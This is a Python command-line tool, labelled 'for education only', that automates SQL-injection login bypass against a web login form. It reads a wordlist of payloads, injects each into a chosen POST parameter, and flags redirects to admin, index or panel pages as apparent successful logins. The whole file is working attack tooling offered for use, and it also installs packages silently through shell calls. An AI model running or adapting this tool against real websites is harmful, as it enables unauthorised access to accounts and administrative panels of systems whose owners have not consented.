# SQL bypass Program open-source 2022 for education only !!!
# Code by SomeOneWannaHackYou
# do not edit or copy. use only
import os
import argparse
import datetime
try:
    import colorama
except:
    os.system("pip3 install colorama")
try:
    import requests
except:
    os.system("pip3 install requests")
red = colorama.Fore.RED
cyan = colorama.Fore.CYAN
yellow = colorama.Fore.YELLOW
green = colorama.Fore.GREEN
blue = colorama.Fore.BLUE
violet = colorama.Fore.MAGENTA
logo = f'''{red}
   ___     _  _    ___    ___      _     
  | _ )   | || |  / __|  / _ \    | |    
  | _ \    \_, |  \__ \ | (_) |   | |__  
  |___/   _|__/   |___/  \__\_\   |____| {cyan}
_|"""""|_| """"|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
'''

def info():
    print(logo)
    print(f"Code by SomeOneWannaHackYou")
    print("The sql bypass injection hacking tools motherfuck*** !!!")
    print(f"{yellow}Help : ")
    print("""-u , --url : url for login db such as login_db.php login_q.php.
-w , --wordlist : wordlist sql bypass payload leave blank if you want default wordlist.
-p, --params : params for login db file. and the sql injection params need to set = %sql%
-c, --content : get content from website. (y/n)""")
def _main():
    try:
       index = 0
       success = False
       parser = argparse.ArgumentParser()
       parser.usage = False
       parser.add_argument("-u", "--url", required=True)
       parser.add_argument("-w", "--wordlist", required=False)
       parser.add_argument("-p", "--params", required=True)
       parser.add_argument("-c", "--content", required=False)
       args = parser.parse_args()
       url = args.url
       wordlist = args.wordlist
       see = args.content
       params = str(args.params).split("&")
       print(logo)
       print(f"{blue}Code by SomeOneWannaHackYou")
       print("Github : https://github.com/ILOVEPYTHONSOMUCH/")
       print("Copyright 2022.")
       print()
       if wordlist == None:
           wordlist = "bysql.txt"
       file = open(f"{wordlist}", "r")
       content = file.readlines()
       print(f"All words : {len(content)} words")
       print(f"{yellow}Start at {datetime.datetime.now()}")
       file.close()
       while success == False:
           try:
            payload = content[index].strip()
           except IndexError:

              print(f"\n{yellow}Finish !!!")
              print(f"\nEnd at {datetime.datetime.now()}")
              break
           payloads = {}
           for param in params:
               if '=%sql%' in param:
                   new_param = param[:param.find("=")]
                   payloads[new_param] = payload
               else:
                   new_param = param[:param.find("=")]
                   payloads[new_param] = param[param.find("=") + 1:]
           respone = requests.post(url=url, data=payloads)
           location = respone.url
           real_data = respone.text
           data = len(respone.text)
           result = respone.status_code
           sign = "#"
           if ('index' in location) or ('admin' in location) or ('panel' in location):
               sign = "!"
           print(f"{green}[{sign}] {location} | {result} [{data} ch] ({payload})")
           if (see == "Y") or (see == "y") or (see == "yes"):
               if data != 0:
                  print(f"\nContent :{violet}\n\n{real_data}\n")
               elif data == 0:
                   pass
           elif (see == "n") or (see == "N") or (see == "no") or (see == None):
               pass
           index += 1
    except Exception as e:
        if 'Temporary failure in name resolution' in str(e):
            print(f"{yellow}Check Your internet !!!")
            exit()
        if 'No such file or directory' in str(e):
            print(f"{yellow}No found wordlist use -w for use your wordlist.")
            exit()
        else:
            print(e)
            info()
            exit()
if __name__ == '__main__':
    try:
     _main()
    except KeyboardInterrupt:
        print(f"\n{yellow}Interrupt !!!")
        exit()
